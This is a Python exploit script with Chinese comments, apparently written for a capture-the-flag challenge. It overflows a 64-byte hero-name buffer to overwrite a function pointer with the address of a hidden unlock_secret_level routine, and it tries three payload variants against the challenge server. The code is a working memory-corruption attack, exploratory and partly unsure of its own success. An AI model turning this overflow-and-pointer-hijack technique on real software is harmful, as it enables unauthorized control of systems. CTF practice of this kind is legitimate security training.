#!/usr/bin/env python3
"""
Name字段溢出exploit - 基于create_hero()函数的name输入溢出
目标：覆盖attack_move函数指针指向unlock_secret_level
"""

import socket
import struct

def connect_remote():
    """连接到远程服务器"""
    host = "night-of-the-living-dead.chall.edgesecurity.team"
    port = 1343
    
    print(f"[+] 连接到 {host}:{port}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def recv_until(s, pattern):
    """接收数据直到遇到指定模式"""
    data = b""
    while pattern not in data:
        data += s.recv(1)
    return data

def exploit_name_overflow():
    """通过name字段溢出覆盖attack_move指针"""
    unlock_secret_level_addr = 0x401296  # 从IDA获取的地址
    
    s = connect_remote()
    
    try:
        # 接收欢迎信息
        welcome = recv_until(s, b"Choice: ")
        print(f"[+] 收到欢迎信息")
        
        # 选择创建Hero
        print("[+] 步骤1: 创建Hero")
        s.send(b"1\n")
        recv_until(s, b"Enter hero name: ")
        
        # 构造溢出payload
        # 策略1: 尝试精确覆盖 - 63字节 + 函数地址
        print(f"[+] 尝试name溢出，目标地址: 0x{unlock_secret_level_addr:x}")
        
        # name[64] 字段填满，然后覆盖attack_move
        payload = b"A" * 56  # 填充部分name
        payload += struct.pack("<Q", unlock_secret_level_addr)  # 8字节地址
        
        # read()限制63字节，但这个地址可能会被写入
        s.send(payload[:63])  # 发送63字节
        
        # 接收Hero创建信息
        hero_info = recv_until(s, b"Choice: ")
        print(f"[+] Hero创建: {hero_info.decode()}")
        
        # 直接执行攻击
        print("[+] 步骤2: 执行攻击")
        s.send(b"3\n")
        
        # 接收结果
        result = s.recv(4096)
        print(f"[SUCCESS] 结果: {result.decode()}")
        
        if b"debug print" in result or b"flag" in result.lower():
            print("[SUCCESS] 成功获取flag!")
            return True
        else:
            print("[-] 第一次尝试失败，尝试其他方法...")
            return False
            
    except Exception as e:
        print(f"[-] 利用过程中出错: {e}")
        return False
    finally:
        s.close()

def exploit_alternative_overflow():
    """备选方法：尝试不同的溢出技术"""
    unlock_secret_level_addr = 0x401296
    
    s = connect_remote()
    
    try:
        recv_until(s, b"Choice: ")
        
        print("[+] 尝试备选溢出方法")
        s.send(b"1\n")
        recv_until(s, b"Enter hero name: ")
        
        # 方法2: 尝试64字节填充
        payload = b"B" * 64
        s.send(payload[:63])  # 仍然受限于63字节
        
        recv_until(s, b"Choice: ")
        
        # 但在这之后，我们可能通过其他方式修改
        # 让我们先看看这样是否有效果
        s.send(b"3\n")
        result = s.recv(1024)
        print(f"[+] 备选方法结果: {result.decode()}")
        
        return b"debug print" in result
        
    except Exception as e:
        print(f"[-] 备选方法出错: {e}")
        return False
    finally:
        s.close()

def exploit_precise_boundary():
    """精确边界利用"""
    unlock_secret_level_addr = 0x401296
    
    s = connect_remote()
    
    try:
        recv_until(s, b"Choice: ")
        
        print("[+] 尝试精确边界利用")
        s.send(b"1\n")
        recv_until(s, b"Enter hero name: ")
        
        # 精确构造: 让地址覆盖到正确位置
        # name字段是64字节，我们需要让函数地址出现在偏移64的位置
        
        # 方法3: 56字节填充 + 8字节地址，总共64字节
        # 但read限制63字节，所以地址会被截断
        # 让我尝试57字节填充 + 6字节地址
        payload = b"C" * 57
        addr_bytes = struct.pack("<Q", unlock_secret_level_addr)
        payload += addr_bytes[:6]  # 只取前6字节，总共63字节
        
        s.send(payload)
        recv_until(s, b"Choice: ")
        
        s.send(b"3\n")
        result = s.recv(1024)
        print(f"[+] 精确边界结果: {result.decode()}")
        
        return b"debug print" in result
        
    except Exception as e:
        print(f"[-] 精确边界出错: {e}")
        return False
    finally:
        s.close()

if __name__ == "__main__":
    print("Name字段溢出Exploit")
    print(f"[+] 目标函数地址: 0x401296")
    
    # 尝试不同的溢出方法
    methods = [
        ("基础溢出", exploit_name_overflow),
        ("备选溢出", exploit_alternative_overflow), 
        ("精确边界", exploit_precise_boundary)
    ]
    
    for method_name, method_func in methods:
        print(f"\n[+] 尝试 {method_name}...")
        if method_func():
            print(f"[SUCCESS] {method_name} 成功!")
            break
        else:
            print(f"[-] {method_name} 失败")
    else:
        print("[-] 所有方法都失败了，可能需要重新分析漏洞")